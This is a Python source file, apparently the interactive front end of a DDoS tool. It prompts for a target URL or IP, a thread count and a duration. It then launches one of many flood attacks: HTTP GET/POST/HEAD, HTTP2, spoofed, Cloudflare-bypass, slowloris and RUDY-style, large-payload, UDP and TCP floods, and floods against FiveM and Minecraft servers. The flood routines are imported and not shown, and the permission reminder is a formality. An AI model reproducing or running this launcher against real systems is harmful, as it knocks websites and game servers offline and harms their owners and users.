import threading, time, sys, datetime, os
from lib.app import *
from lib.func import *
from colorama import Fore

# View
def DdosGET():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")

    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchGET(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosPOST():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")

    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosSOC():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
def DdosHTTP2():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
        
def DdosSPOOF():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosHEAD():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosSKY():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        threading.Thread(target=attackSTELLAR, args=(target, thread, t)).start()
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
        
def DdosCFREQ():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        if get_cookie(target):
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset")
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
def DdosCFSOC():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        if get_cookie(target):
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset.")
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
def DdosCFB():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosSLOW():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchSLOW(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
        
def DdosMBP():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    mb = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Payload MB : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchMBP(target, thread, t,mb)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
        
def DdosRUDY():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
        
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        LaunchRUDY(target, thread, t)
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()


        
def DdosUDP():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=runsender, args=(target, port, t, thread,"")).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosTCP():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosFIVEM():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=LaunchFIVEM, args=(target, port, thread, t)).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()

def DdosMC():
    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
    port = input(Fore.MAGENTA+" [*] "+Fore.RESET+"PORT : ")
    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
    
    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")

    if "Y" in quest.upper():
        threading.Thread(target=LaunchMC, args=(target, port, thread, t)).start()
        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
        timer.start()
        timer.join()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
        sys.exit()
